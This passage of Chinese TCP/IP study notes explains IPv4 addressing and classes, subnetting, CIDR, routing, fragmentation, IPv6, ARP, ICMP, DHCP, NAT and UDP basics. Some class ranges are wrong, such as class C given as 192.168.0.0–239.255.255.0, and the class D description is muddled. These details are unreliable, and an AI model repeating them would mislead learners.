方式被处理。然而，由于人类社会并不习惯于采用二进制方式，需要采用一种特殊的标记方式。==那就是将32位的IP地址以每8位为一组，分成4组，每组以“.”隔开，再将每组数转换为十进制数==（这种方法也叫做“十进制点符号”（Dot- decimal notation）） 。\nIP地址由网络和主机两部分标识组成\nIP地址由==“网络标识（网络地址）”和“主机标识（主机地址）”==两部分组成（192.168.128.10/24中的“/24”表示从第1位开始到多少位属于网络标识。在这个例子中，192.168.128之前的都是该IP的网络地址）。\n网络标识在数据链路的每个段配置不同的值。网络标识必须保证==相互连接的每个段的地址不相重复==。而==相同段内相连的主机必须有相同的网络地址==。IP地址的==“主机标识”则不允许在同一个网段内重复出现==。\n究竟从第几位开始到第几位算是网络标识，又从第几位开始到第几位算是主机标识呢？关于这点，有约定俗成的两种类型。最初二者以==分类进行区别==。而现在基本以==子网掩码（网络前缀）==区分。不过，请读者注意，在有些情况下依据部分功能、系统和协议的需求，前一种的方法依然存在。\nIP地址的分类 IP地址分为四个级别，分别为A类、B类、C类、D类（还有一个一直未使用的E类。） 。它根据IP地址中从第1位到第4位的比特列对其网络标识和主机标识进行区分。\n■ A类地址\nA类IP地址是首位以“0”开头的地址。从第1位到第8位（去掉分类位剩下7位） 是它的网络标识。用十进制表示的话，0.0.0.0～127.0.0.0是A类的网络地址。A类地址的后24位相当于主机标识。因此，一个网段内可容纳的主机地址上限为16，777，214个 。\n■ B类地址\nB类IP地址是前两位为“10”的地址。从第1位到第16位（去掉分类位剩下14位）是它的网络标识。用十进制表示的话，128.0.0.1～ 191.255.0.0是B类的网络地址。B类地址的后16位相当于主机标识。因此，一个网段内可容纳的主机地址上限为65，534个。\n■ C类地址\nC类IP地址是前三位为“110”的地址。从第1位到第24位（去掉分类位剩下21位）是它的网络标识。用十进制表示的话，192.168.0.0～ 239.255.255.0是C类的网络地址。C类地址的后8位相当于主机标识。因此，一个网段内可容纳的主机地址上限为254个 。\n■ D类地址\nD类IP地址是前四位为“1110”的地址。从第1位到第32位（去掉分类位剩下28位） 是它的网络标识。用十进制表示的话，224.0.0.0～239.255.255.255是D类的网络地址。D类地址没有主机标识，常被用于多播。\n■ 关于分配IP主机地址的注意事项\n在分配IP地址时关于主机标识有一点需要注意。即要用比特位表示主机地址时，不可以全部为0或全部为1。因为全部为只有0在表示对应的网络地址或IP地址不可获知的情况下才使用。而全部为1的主机地址通常作为广播地址。 因此，在分配过程中，应该去掉这两种情况。这也是为什么C类地址每个网段最多只能有254（28 -2=254）个主机地址的原因。\n广播地址\n广播地址用于在同一个链路中相互连接的主机之间发送数据包。将IP地址中的主机地址部分全部设置为1，就成为了广播地址（以太网中如果将MAC地址的所有位都改为1，则形成FF：FF：FF：FF：FF：FF的广播地址。因此，广播的IP包以数据链路的帧的形式发送时，得通过MAC地址为全1比特的FF：FF：FF：FF：FF：FF转发。）\n广播分为==本地广播==和==直接广播==两种。\n在本网络内的广播叫做本地广播。例如网络地址为192.168.0.0/24的情况下，广播地址是192.168.0.255。因为这个广播地址的IP包会被路由器屏蔽，所以不会到达192.168.0.0/24以外的其他链路上。\n在不同网络之间的广播叫做直接广播。例如网络地址为192.168.0.0/24的主机向192.168.1.255/24的目标地址发送IP包。收到这个包的路由器，将数据转发给192.168.1.0/24，从而使得所有192.168.1.1～ 192.168.1.254的主机都能收到这个包（由于直接广播有一定的安全问题，多数情况下会在路由器上设置为不转发） 。\nIP多播\n■同时发送提高效率\n==多播用于将包发送给特定组内的所有主机==。由于其直接使用IP协议，因此也不存在可靠传输。\n多播这种既可以穿透路由器，又可以实现只给那些必要的组发送数据包的技术就成为必选之路了。\n■ IP多播与地址\n多播使用D类地址。因此，如果从首位开始到第4位是“1110”，就可以认为是多播地址。而剩下的28位可以成为多播的组编号。 从224.0.0.0到239.255.255.255都是多播地址的可用范围。\n子网掩码 自从引入了子网以后，一个IP地址就有了两种识别码。==一是IP地址本身，另一个是表示网络部的子网掩码。==子网掩码用二进制方式表示的话，也是一个32位的数字。它对应IP地址网络标识部分的位全部为“1”，对应IP地址主机标识的部分则全部为“0”。由此，一个IP地址可以不再受限于自己的类别，而是可以用这样的子网掩码自由地定位自己的网络标识长度。当然，子网掩码必须是IP地址的首位开始连续的“1”。\n对于子网掩码，目前有两种表示方式。以172.20.100.52的前26位是网络地址的情况为例，以下是其中一种表示方法，它将IP地址与子网掩码的地址分别用两行来表示。\n另一种表示方式如下所示。它在每个IP地址后面追加网络地址的位数（这种方式也叫“后缀”表示法。） 用“/”隔开。\n不难看出，在第二种方式下记述网络地址时可以省略后面的“0”。例如172.20.0.0/16跟172.20/16其实是一个意思。\nCIDR与VLSM 采用任意长度分割IP地址的网络标识和主机标识。这种方式叫做==CIDR==，意为“无类别域间路由”。 由于BGP（Border Gateway Protocol，边界网关协议）对应了CIDR，所以不受IP地址分类的限制自由分配（Classless Inter-Domain Routing） 。\n在CIDR被应用到互联网的初期，网络内部采用固定长度的子网掩码机制。也就是说，当子网掩码的长度被设置为/25以后，域内所有的子网掩码都得使用同样的长度。然而，有些部门可能有500台主机，另一些部门可能只有50台主机。如果全部采用统一标准，就难以架构一个高效的网络结构。为此人们提出组织内要使用可变长度的、高效的IP地 址分配方式。\n于是产生了一种可以随机修改组织内各个部门的子网掩码长度的机制——==VLSM（可变长子网掩码）（Variable Length Subnet Mask）== 。它可以通过域间路由协议转换为RIP2（7.4.5节）以及OSPF（7.5节） 实现。根据VLSM可以将网络地址划分为主机数为500个时子网掩码长度为/23，主机数为50个时子网掩码长度为/26。从而在理论上可以将IP地址的利用率提高至50％。\n有了CIDR和VLSM技术，确实相对缓解了全局IP地址（为了对应全局IP地址不足的问题，除了CIDR和VLSM之外还有NAT（5.6节）、代理服务器（1.9.7节）等技术） 不够用的问题。==但是IP地址的绝对数本身有限的事实无法改变==。因此才会出现本章4.6节中将要介绍的==IPv6==等IPv4以外的方法。\n全局地址与私有地址 对于那些没有连接互联网的独立网络中的主机，只要保证在这个网络内地址唯一，可以不用考虑互联网即可配置相应的IP地址。不过，即使让每个独立的网络各自随意地设置IP地址，也可能会有问题。于是又出现了私有网络的IP地址。它的地址范围如下所示：\n==包含在这个范围内的IP地址都属于私有IP==，而在此之外（A类～C类范围中除去0/8、127/8） 的IP地址称为全局IP（也叫公网IP）\n私有IP最早没有计划连接互联网，而只用于互联网之外的独立网络。然而，当一种能够互换私有IP与全局IP的NAT（更多细节请参考5.6节） 技术诞生以后，配有私有地址的主机与配有全局地址的互联网主机实现了通信。\n全局IP地址基本上要在整个互联网范围内保持唯一 ，但私有地址不需要。只要在同一个域里保证唯一即可。在不同的域里出现相同的私有IP不会影响使用。\n4.路由控制 发送数据包时所使用的地址是网络层的地址，即IP地址。然而仅仅有IP地址还不足以实现将数据包发送到对端目标地址，在数据发送过程中还需要类似于“指明路由器或主机”的信息，以便真正发往目标地址。保存这种信息的就是==路由控制表（Routing Table）==。实现IP通信的主机和路由器都必须持有一张这样的表。它们也正是在这个表格的基础上才得以进行数据包发送的。\n该路由控制表的形成方式有两种：一种是管理员手动设置，另一种是路由器与其他路由器相互交换信息时自动刷新。前者也叫==静态路由控制==，而后者叫做==动态路由控制==。\n■ 默认路由\n如果一张路由表中包含所有的网络及其子网的信息，将会造成无端的浪费。这时，==默认路由（Default Route）==是不错的选择。默认路由是指路由表中任何一个地址都能与之匹配的记录。 ==默认路由一般标记为0.0.0.0/0或default（表示子网掩码时，IP地址为0.0.0.0，子网掩码也是0.0.0.0）== 。这里的0.0.0.0/0并不是指IP地址是0.0.0.0。由于后面是“/0”，所以并没有标识IP地址（0.0.0.0的IP地址应该记述为0.0.0.0/32） 。它只是为了避免人们误以为0.0.0.0是IP 地址。有时默认路由也被标记为default，但是在计算机内部和路由协议的发送过程中还是以0.0.0.0/0进行处理。\n■ 主机路由\n==“IP地址/32”也被称为主机路由（Host Route）==。例如， ==192.168.153.15/32（表示子网掩码时，若IP地址为192.168.153.15，其对应的子网掩码为255.255.255.255）== 就是一种主机路由。它的意思是整个IP地址的所有位都将参与路由。进行主机路由，意味着要基于主机上网卡上配置的IP地址本身，而不是基于该地址的网络地址部分进行路由。\n■ 环回地址\n环回地址是==在同一台计算机上的程序之间进行网络通信时所使用的一个默认地址==。计算机使用一个特殊的IP地址==127.0.0.1==作为环回地址。与该地址具有相同意义的是一个叫做==localhost==的主机名。使用这个IP或主机名时，数据包不会流向网络。\n路由控制表的聚合\n利用网络地址的比特分布可以有效地进行分层配置。对内即使有多个子网掩码，对外呈现出的也是同一个网络地址。这样可以更好地构建网络，==通过路由信息的聚合可以有效地减少路由表的条目（路由表的聚合也叫路由汇总（Aggregation））== 。\n5.IP分割处理与再构成处理 数据链路不同，MTU则相异\nIP报文的分片与重组\n任何一台主机都有必要对IP分片（IP Fragmentation）进行相应的处理。分片往往在网络上遇到比较大的报文无法一下子发送出去时才会进行处理。\n图4.24展示了网络传输过程中进行分片处理的一个例子。由于以太网的默认MTU是1500字节，因此4342字节的IP数据报无法在一个帧当中发送完成。这时，==路由器将此IP数据报划分成了3个分片进行发送==。\n这样的处理是由诸多方面的因素造成的。例如，现实当中无法保证IP数据报是否经由同一个路径传送。因此，途中即使等待片刻，数据包也有可能无法到达目的地。此外，拆分之后的每个分片也有可能会在途中丢失（在目标主机上进行分片的重组时，可能有一部分包会延迟到达。因此，一般会从第一个数据报的分片到达的那一刻起等待约30秒再进行处理） 。即使在途中某一处被重新组装，但如果下一站再经过其他路由时还会面临被分片的可能。这会给路由器带来多余的负担，也会降低网络传送效率。出于这些原因，在终结点（目标主机）端重组分片了的IP数据报成为现行的规范。\n路径MTU发现\n分片机制也有它的不足。首先，路由器的处理负荷加重。随着时代的变迁，计算机网络的物理传输速度不断上升。这些高速的链路，对路由器和计算机网络提出了更高的要求。另一方面，随着人们对网络安全的要求提高，路由器需要做的其他处理也越来越多，如网络过滤等。因此，只要允许，是==不希望由路由器进行IP数据包的分片处理的==。\n为了应对以上问题，产生了一种新的技术==“路径MTU发现”（Path MTU Discovery（也可以缩写为PMTUD））==\n路径MTU（Path MTU）是指从发送端主机到接收端主机之间不需要分片时最大MTU的大小。\n路径MTU发现从发送主机按照路径MTU的大小将数据报分片后进行发送。进行路径MTU发现，就可以==避免在中途的路由器上进行分片处理，也可以在TCP中发送更大的包==。\n6.IPv6 IPv6（IP version 6）是为了根本解决IPv4地址耗尽的问题而被标准化的网际协议。IPv4的地址长度为4个8位字节，即32比特。而IPv6的地址长度则是原来的4倍，即128比特（因此IPv6的地址空间是IPv4的2^96^=7.923×10^28^ 倍） ，一般写成8个16位字节。\nIPv6的特点 IP地址的扩大与路由控制表的聚合 IP地址依然适应互联网分层构造。分配与其地址结构相适应的IP地址，尽可能避免路由表膨大。\n性能提升 包首部长度采用固定的值（40字节），不再采用首部检验码。简化首部结构，减轻路由器负荷。路由器不再做分片处理（通过路径MTU发现只由发送端主机进行分片处理）。\n支持即插即用功能 即使没有DHCP服务器也可以实现自动分配IP地址。\n采用认证与加密功能 应对伪造IP地址的网络安全功能以及防止线路窃听的功能 （IPsec）。\n多播、Mobile IP成为扩展功能 多播和Mobile IP被定义为IPv6的扩展功能。由此可以预期，曾在 IPv4中难于应用的这两个功能在IPv6中能够顺利使用。\nIPv6中IP地址的标记方法 IPv6的IP地址长度为128位。它所能表示的数字高达38位数（2^128^ = 约3.40×10^38^）\n如果将IPv6的地址像IPv4的地址一样用十进制数据表示的话，是16个数字的序列（IPv4是4个数字的序列）。由于用16个数字序列表示显得有些麻烦，因此，将IPv6和IPv4在标记方法上进行区分。一般人们将128比特IP地址以==每16比特为一组，每组用冒号（“：”）隔开进行标记==。而且如果出现连续的0时还可以将这些0省略，并用两个冒号 （“：：”）隔开。但是，一个IP地址中只允许出现一次两个连续的冒号。\nIPv6地址的结构 7.IPv4首部以及IPv6首部 第5章 IP协议相关技术 1.DNS **主机识别码：**这种识别方式是指为每台计算机赋以唯一的主机名，在进行网络通信时可以直接使用主机名称而无需输入一大长串的IP地址。并且此时，系统必须自动将主机名转换为具体的IP地址。为了实现这样的功能，主机往往会利用一个叫做hosts的数据库文件。\n域名服务器\n域名服务器是指管理域名的主机和相应的软件，它可以管理所在分层的域的相关信息。 每层都设有一个域名服务器。根域名服务器中注册着根以下第1层域名服务器的IP地址。\n域名和域名服务器需要按照分层进行设置。\n所有的域名服务器都必须注册根域名服务器的IP地址。因为DNS根据IP地址进行检索时，需要从根域名服务器开始按顺序进行。\n解析器（Resolver）\n进行DNS查询的主机和软件叫做DNS解析器。用户所使用的工作站或个人电脑都属于解析器。一个解析器至少要注册一个以上域名服务器的IP地址。通常，它至少包括组织内部的域名服务器的IP地址。\nDNS查询\n2.ARP ==ARP（Address Resolution Protocol）==是一种解决地址问题的协议。以目标IP地址为线索，用来定位下一个应该接收数据分包的网络设备对应的MAC地址。如果目标主机不在同一个链路上时，可以通过ARP查找下一跳路由器的MAC地址。不过ARP只适用于IPv4，不能用于IPv6。IPv6中可以用ICMPv6替代ARP发送邻居探索消息。\nARP的工作机制\n主机A为了获得主机B的MAC地址，起初要通过广播发送一个ARP请求包。这个包中包含了想要了解其MAC地址的主机IP地址。也就是说，ARP请求包中已经包含了主机B的IP地址172.20.1.2。由于广播的包可以被同一个链路上所有的主机或路由器接收，因此ARP的请求包也就会被这同一个链路上所有的主机和路由器进行解析。如果ARP请求包中的目标IP地址与自己的IP地址一致，那么这个节点就将自己的MAC地址塞入ARP响应包返回给主机A。\nRARP\nRARP（Reverse Address Resolution Protocol）是将ARP反过来，从MAC地址定位IP地址的一种协议。例如将打印机服务器等小型嵌入式设备接入到网络时就经常会用得到。\n平常我们可以通过个人电脑设置IP地址，也可以通过DHCP（Dynamic Host Configuration Protocol， DHCP可以像RARP一样分配一个固定的IP地址） 自动分配获取IP地址。 然而，对于使用嵌入式设备时，会遇到没有任何输入接口或无法通过 DHCP动态获取IP地址的情况 。\n在类似情况下，就可以使用RARP。为此，需要架设一台RARP服务器，从而在这个服务器上注册设备的MAC地址及其IP地址（使用RARP的前提是认为MAC地址就是设备固有的一个值） 。然后再将这个设备接入到网络，插电启动设备时，该设备会发送一条“我的MAC地址是xxx，请告诉我，我的IP地址应该是什么”的请求信息。RARP服务器接到这个消息后返回类似于“MAC地址为xxx的设备，IP地址为xxx”的信息给这个设备。而设备就根据从RARP服务器所收到的应答信息设置自己的IP地址。\n3.ICMP 架构IP网络时需要特别注意两点：确认网络是否正常工作，以及遇到异常时进行问题诊断。\nICMP的主要功能包括，==确认IP包是否成功送达目标地址，通知在发送过程当中IP包被废弃的具体原因，改善网络设置等==。有了这些功能以后，就可以获得网络是否正常、设置是否有误以及设备有何异常等信息，从而便于进行网络上的问题诊断。\n在IP通信中如果某个IP包因为某种原因未能达到目标地址，那么这个具体的原因将由ICMP负责通知。\nICMP的消息大致可以分为两类：一类是==通知出错原因的错误消息==，另一类是==用于诊断的查询消息==。\n表5.2 ICMP消息类型\n主要的ICMP消息 ■ ICMP目标不可达消息（类型3）\nIP路由器无法将IP数据包发送给目标地址时，会给发送端主机返回一个目标不可达（Destination Unreachable Message）的ICMP消息，并在这个消息中显示不可达的具体原因\n■ ICMP重定向消息（类型5）\n如果路由器发现发送端主机使用了次优的路径发送数据，那么它会返回一个ICMP重定向（ICMP Redirect Message）的消息给这个主机。在这个消息中包含了最合适的路由信息和源数据。这主要发生在路由器持有更好的路由信息的情况下。路由器会通过这样的ICMP消息给发送端主机一个更合适的发送路由。\n■ ICMP超时消息（类型11）\nIP包中有一个字段叫做TTL（Time To Live，生存周期），它的值随着每经过一次路由器就会减1（当IP包在路由器上停留1秒以上时减去所停留的秒数，但是现在绝大多数设备并不做这样的处理。） ，直到减到0时该IP包会被丢弃。此时，IP路由器将会发送一个ICMP超时的消息（ICMP Time Exceeded Message，错误号0（错误号1表示将被拆分包做重构处理时超时） ）给发送端主机，并通知该包已被丢弃。\n■ ICMP回送消息（类型0、8）\n用于进行通信的主机或路由器之间，判断所发送的数据包是否已经成功到达对端的一种消息。可以向对端主机发送回送请求的消息 （ICMP Echo Request Message，类型8），也可以接收对端主机发回来的回送应答消息（ICMP Echo Reply Message，类型0）。网络上最常用的==ping命令==（Packet InterNetwork Groper，判断对端主机是否可达的一种命令） 就是利用这个消息实现的。\n■ ICMP原点抑制消息（类型4）\n在使用低速广域线路的情况下，连接WAN的路由器可能会遇到网络拥堵的问题。ICMP原点抑制消息的目的就是为了缓和这种拥堵情况。当路由器向低速线路发送数据时，其发送队列的残存变为零而无法发送出去时，可以向IP包的源地址发送一个ICMP原点抑制（ICMP Source Quench Message）消息。收到这个消息的主机借此了解在整个线路的某一处发生了拥堵的情况，从而打开IP包的传输间隔。然而，由于这种ICMP可能会引起不公平的网络通信，一般不被使用。\n■ ICMP路由器探索消息（类型9、10）\n主要用于发现与自己相连网络中的路由器。当一台主机发出ICMP路由器请求（Router Solicitaion，类型10）时，路由器则返回ICMP路由器公告消息（Router Advertisement，类型9）给主机。\n■ ICMP地址掩码消息（类型17、18）\n主要用于主机或路由器想要了解子网掩码的情况。可以向那些目标主机或路由器发送ICMP地址掩码请求消息（\nICMP Address Mask Request，类型17），然后通过接收ICMP地址掩码应答消息（ICMP Address Mask Reply，类型18）获取子网掩码的信息。\nICMPv6 IPv4中ICMP仅作为一个辅助作用支持IPv4。也就是说，在IPv4时期，即使没有ICMP，仍然可以实现IP通信。然而，在IPv6中，ICMP的作用被扩大，如果没有ICMPv6，IPv6就无法进行正常通信。\n尤其在IPv6中，从IP地址定位MAC地址的协议从ARP转为ICMP的邻居探索消息（Neighbor Discovery）。这种邻居探索消息融合了IPv4的ARP、ICMP重定向以及ICMP路由器选择消息等功能于一体，甚至还提供自动设置IP地址的功能（ICMPv6中没有DNS服务器的通知功能，因此实际上需要与DHCPv6组合起来才能实现自动设置IP地址） 。\n■ 邻居探索\nICMPv6中从类型133至类型137的消息叫做邻居探索消息。这种邻居探索消息对于IPv6通信起着举足轻重的作用。==邻居请求消息用于查询IPv6的地址与MAC地址的对应关系，并由邻居宣告消息得知MAC地址==（IPv4中查询IP地址与MAC地址对应关系用到的是ARP） 。邻居请求消息利用IPv6的多播地址（IPv4中所使用的ARP采用广播，使得不支持ARP的节点也会收到包，造成一定的浪费） 实现传输。\n4.DHCP 如果逐一为每一台主机设置IP地址会非常繁琐的事情。特别是在移动使用笔记本电脑、智能终端以及平板电脑等设备时，每移动到一个新的地方，都要重新设置IP地址。\n于是，为了实现自动设置IP地址、统一管理IP地址分配，就产生了==DHCP（Dynamic Host Configuration Protocol）==协议。有了DHCP，计算机只要连接到网络，就可以进行TCP/IP通信。也就是说，DHCP让即插即用（指只要物理上一连通，无需专门设置就可以直接使用这个物理设备） 变得可能。而DHCP不仅在IPv4中，在IPv6中也可以使用。\nDHCP的工作机制 使用DHCP之前，首先要架设一台DHCP服务器（很多时候用该网段的路由器充当DHCP服务器） 。然后将DHCP所要分配的IP地址设置到服务器上。此外，还需要将相应的子网掩码、路由控制信息以及DNS服务器的地址等设置到服务器上。\n关于从DHCP中获取IP地址的流程，以图5.17为例简单说明的话， 主要分为两个阶段（在发送DHCP发现包与DHCP请求包时，DHCP即插即用的IP地址尚未确定。因此，DHCP发现包的目标地址为广播地址255.255.255.255，而源地址则为0.0.0.0，表示未知） 。\nDHCP在分配IP地址有两种方法。一种是由DHCP服务器在特定的IP地址中自动选出一个进行分配。另一种方法是针对MAC地址 分配一个固定的IP地址。而且这两种方法可以并用。\n为了检查所要分配的IP地址以及已经分配了的IP地址是否可用， DHCP服务器或DHCP客户端必须具备以下功能：\nDHCP服务器 ==在分配IP地址前发送ICMP回送请求包，确认没有返回应答。==\nDHCP客户端 ==针对从DHCP那里获得的IP地址发送ARP请求包，确认没有返回应答。==\n在获得IP地址之前做这种事先处理可能会耗一点时间，但是可以安全地进行IP地址分配。\nDHCP中继代理 家庭网络大多都只有一个以太网（无线LAN）的网段，与其连接的主机台数也不会太多。因此，只要有一台DHCP服务器就足以应对IP地址分配的需求，而大多数情况下都由宽带路由器充当这个DHCP的角色。\n相比之下，一个企业或学校等较大规模组织机构的网络环境当中，一般会有多个以太网（无线LAN）网段。在这种情况下，若要针对每个网段都设置DHCP服务器将会是个庞大的工程。即使路由器可以分担DHCP的功能，如果网络中有不下100个路由器，就要为100个路由器设置它们各自可分配IP地址的范围，并对这些范围进行后续的变更维护，这将是一个极其耗时和难于管理的工作（DHCP服务器分配的IP地址范围，有时会随着服务器或打印机等固定IP设备的增减而不得不发生变化） 。也就是说将DHCP服务器分设到各个路由器上，于管理和运维都不是件有益的事。\n因此，在这类网络环境中，往往需要将DHCP统一管理。具体方法可以使用==DHCP中继代理来实现==。有了DHCP中继代理以后，==对不同网段的IP地址分配也可以由一个DHCP服务器统一进行管理和运维==。\n这种方法使得在每个网段架设一个DHCP服务器被取代，==只需在每个网段设置一个DHCP中继代理即可==（DHCP中继代理多数为路由器，不过也有在主机中安装某些软件得以实现的情况） 。==它可以设置DHCP服务器的IP地址==，从而可以在DHCP服务器上为每个网段注册IP地址的分配范围。\nDHCP客户端会向DHCP中继代理发送DHCP请求包，而DHCP中继代理在收到这个广播包以后再以单播的形式发给DHCP服务器。服务器端收到该包以后再向DHCP中继代理返回应答，并由DHCP中继代理将此包转发给DHCP客户端（DHCP包中包含发出请求的主机的==MAC地址==。DHCP中继代理正是利用这个MAC地址将包返回给了DHCP客户端） 。由此，==DHCP服务器即使不在同一个链路上也可以实现统一分配和管理IP地址==。\n5.NAT NAT（Network Address Translator， 网络地址转换）是用于==在本地网络中使用私有地址，在连接互联网时转而使用全局IP地址的技术==。除转换IP地址外，还出现了可以转换TCP、UDP端口号的==NAPT（Network Address Ports Translator）==技术，由此可以实现用一个全局IP地址与多个主机的通信（通常人们提到的NAT，多半是指NAPT。NAPT也叫做IP伪装或MultiNAT）\nNAT的工作机制 如图5.19所示，以10.0.0.10的主机与163.221.120.9的主机进行通信为例。利用NAT，途中的NAT路由器将发送源地址从10.0.0.10转换为全局的IP地址（202.244.174.37）再发送数据。反之，当包从地址163.221.120.9发过来时，目标地址（202.244.174.37）先被转换成私有IP地址10.0.0.10以后再被转发（在TCP或UDP中，由于IP首部中的IP地址还要用于校验和的计算，因此当IP地址发生变化时，也需要相应地将TCP、UDP的首部进行转换） 。\n==在NAT（NAPT）路由器的内部，有一张自动生成的用来转换地址的表==。当10.0.0.10向163.221.120.9发送第一个包时生成这张表，并按照表中的映射关系进行处理。\n当私有网络内的多台机器同时都要与外部进行通信时，仅仅转换IP地址，人们不免担心全局IP地址是否不够用。这时采用如图5.20所示的包含端口号一起转换的方式==（NAPT）==可以解决这个问题。\n在使用TCP或UDP的通信当中，只有目标地址、源地址、目标端口、源端口以及协议类型（TCP还是UDP）五项内容都一致时才被认为是同一个通信连接。此时所使用的正是NAPT。\n图5.20中，主机163.221.120.9的端口号是80，LAN中有两个客户端10.0.0.10和10.0.0.11同时进行通信，并且这两个客户端的本地端口都是1025。此时，仅仅转换IP地址为某个全局地址202.244.174.37，会令转换后的所有数字完全一致。为此，只要将10.0.0.11的端口号转换为1026就可以解决问题。如图5.20所示，生成一个NAPT路由器的转换表，就可以正确地转换地址跟端口的组合，令客户端A、B能同时与服务器之间进行通信。\nNAT-PT（NAPT-PT） 现在很多互联网服务都基于IPv4。如果这些服务不能做到在IPv6中也能正常使用的话，搭建IPv6网络环境的优势也就无从谈起了。 为了解决这个问题，就产生了==NAT-PT（NAPT-PT）==（PT是 Protocol Translatio的缩写。严格来讲NAT-PT用来翻译IP地址，而NATP-PT则是用来翻译IP首部与端口号的） 规范。==NAT-PT是将IPv6的首部转换为IPv4的首部的一种技术==。有了这种技术，那些只有IPv6地址的主机也就能够与IPv4地址的其他主机进行通信了。\n6.IP隧道 在一个如图5.22所示的网络环境里，网络A、B使用IPv6，如果处于中间位置的网络C支持使用IPv4的话，网络A与网络B之间将无法直接进行通信。为了让它们之间正常通信，这时必须得采用IP隧道的功能。\nIP隧道中可以将那些从网络A发过来的IPv6的包统和为一个数据， ==再为之追加一个IPv4的首部以后转发给网络C==。\n7.IP相关技术 IP任播 IP任播主要用于报警电话110与消防电话119系统。当人们拨打110或119时，其接收电话并不是只有一个，而是可以拨打到一个区域管辖范围内的所有公安或消防部门。省、市、县、乡等不同级别的区域都各自设置着110与119的急救电话，而且数量极其庞大。这种机制的实现，在互联网上就是IP任播。\n==IP任播是指为那些提供同一种服务的服务器配置同一个IP地址，并与最近的服务器进行通信的一种方法（选择哪个服务器由路由协议的类型和设置方法决定）==。\n在==IP任播==的应用当中最为有名的当属==DNS根域名服务器==。DNS根域名服务器，出于历史原因，对IP地址的分类限制为13种类型。从负载均衡与灾备应对的角度来看，全世界根域名服务器不可能只设置13处。为此，使用IP任播可以让更多的DNS根域名服务器散布到世界的各个角落。因此，当发送一个请求包给DNS根域名服务器时，一个适当区域的IP地址也将被发送出去，从而可以从这个服务器获得应答。\n第6章 TCP与UDP 传输层的TCP和UDP，为了识别自己所传输的数据部分究竟应该发给哪个应用，也设定了这样一个编号。\n传输层必须指出这个具体的程序，为了实现这一功能，使用==端口==（注意此处的端口与路由器、交换机等设备上指网卡的端口有所不同）号这样一种识别码。根据端口号就可以识别在传输层上一层的应用层中所要进行处理的具体程序（一个程序可以使用多个端口） 。\nTCP/IP的众多应用协议大多以客户端/服务端的形式运行。\n作为服务端的程序有必要提前启动，准备接收客户端的请求。否则即使有客户端的请求发过来，也无法做到相应的处理。\n这些服务端程序在UNIX系统当中叫做==守护进程==。例如HTTP的服务端程序是httpd（HTTP守护进程），而ssh的服务端程序是sshd（SSH守护进程）。在UNIX中并不需要将这些守护进程逐个启动，而是启动一个可以代表它们接收客户端请求的inetd（互联网守护进程）服务程序即可。它是一种超级守护进程。该超级守护进程收到客户端请求以后会创建（fork）新的进程并转换（exec）为sshd等各个守护进程。\n■ TCP\nTCP是==面向连接的、可靠的流协议==。流就是指不间断的数据结构， 你可以把它想象成排水管道中的水流。当应用程序采用TCP发送消息时，虽然可以保证发送的顺序，但还是犹如没有任何间隔的数据流发送给接收端（例如，在发送端应用程序发送了10次100字节的消息，那么在接收端，应用程序有可能会收到一个1000字节连续不间断的数据。因此在TCP通信中，发送端应用可以在自己所要发送的消息中设置一个表示长度或间隔的字段信息） 。TCP为提供可靠性传输，实行“顺序控制”或“重发控制”机制。此外还具备“流控制（流量控制）”、“拥塞控制”、提高网络利用率等众多功 能。\n■ UDP\nUDP是==不具有可靠性的数据报协议==。细微的处理它会交给上层的应用去完成。在UDP的情况下，虽然可以确保发送消息的大小（例如，发送端应用程序发送一个100字节的消息，那么接收端应用程序也会以100字节为长度接收数据。UDP中，消息长度的数据也会发送到接收端，因此在发送的消息中不需要设置一个表示消息长度或间隔的字段信息。然而，UDP不具备可靠传输。所以，==发送端发出去的消息在网络传输途中一旦丢失，接收端将收不到这个消息==） ，却不能保证消息一定会到达。因此，应用有时会根据自己的需要进行重发处理。\nTCP用于在传输层有必要实现可靠传输的情况。由于它是面向有连接并具备顺序控制、重发控制等机制的，所以它可以为应用提供可靠传输。\n而在一方面，UDP主要用于那些对高速传输和实时性有较高要求的通信或广播通信。我们举一个通过IP电话进行通话的例子。如果使用TCP，数据在传送途中如果丢失会被重发，但这样无法流畅地传输通话人的声音，会导致无法进行正常交流。而采用UDP，它不会进行重发处理。从而也就不会有声音大幅度延迟到达的问题。即使有部分数据丢失，也只是会影响某一小部分的通话（在实时传送动画或声音时，途中一小部分网络的丢包可能会导致画面或声音的短暂停顿甚至出现混乱。 但在实际使用当中，这一点干扰并无大碍） 。此外，在多播与广播通信中也使用UDP而不是TCP。RIP（7.4节）、DHCP（5.5节）等基于广播的协议也要依赖于UDP。\n1.端口号 数据链路和IP中的地址，分别指的是MAC地址和IP地址。前者用来识别同一链路中不同的计算机，后者用来识别TCP/IP网络中互连的主机和路由器。在传输层中也有这种类似于地址的概念，那就是端口号。端口号用来识别同一台计算机中进行通信的不同应用程序。因此，它也被称为程序地址。\n==仅凭目标端口识别某一个通信是远远不够的。==\n因此，TCP/IP或UDP/IP通信中通常采用5个信息来识别（这个信息可以在Unix或Windows系统中通过netstat -n 命令显示） 一个通信。它们是==“源IP地址”、“目标IP地址”、“协议号”、“源端口号”、“目标端口号”==。只要其中某一项不同，则被认为是其他通信。\n端口号如何确定\n■ 标准既定的端口号\n这种方法也叫静态方法。它是指每个应用程序都有其指定的端口号。但并不是说可以随意使用任何一个端口号。每个端口号都有其对应的使用目的。例如，HTTP、TELNET、FTP等广为使用的应用协议中所使用的端口号就是固定的。这些端口号也被称之为知名端口号（Well-Known Port Number）。\n■ 时序分配法\n第二种方法也叫时序（或动态的）分配法。此时，服务端有必要确定监听端口号，但是接受服务的客户端没必要确定端口号。\n在这种方法下，客户端应用程序可以完全不用自己设置端口号，而全权交给操作系统进行分配。操作系统可以为每个应用程序分配互不冲突的端口号。例如，每需要一个新的端口号时，就在之前分配号码的基础上加1。这样，操作系统就可以动态地管理端口号了。==根据这种动态分配端口号的机制，即使是同一个客户端程序发起的多个TCP连接，识别这些通信连接的5部分数字也不会全部相同==。\n2.UDP UDP是User Datagram Protocol（用户数据报协议）的缩写。\nUDP不提供复杂的控制机制，利用IP提供面向无连接的通信服务。 并且它是将应用程序发来的数据在收到的那一刻，立即按照原样发送到网络上的一种机制。\n即使是出现网络拥堵的情况下，UDP也无法进行流量控制等避免网络拥塞的行为。此外，传输途中即使出现丢包，UDP也不负责重发。甚至当出现包的到达顺序乱掉时也没有纠正的功能。如果需要这些细节控 制，那么不得不交由采用UDP的应用程序去处理（拥塞控制）。\n由于UDP面向无连接，它可以随时发送数据。再加上UDP本身的处理既简单又高效，因此经常用于以下几个方面：\n包总量较少的通信（DNS、SNMP等） 视频、音频等多媒体通信（即时通信） 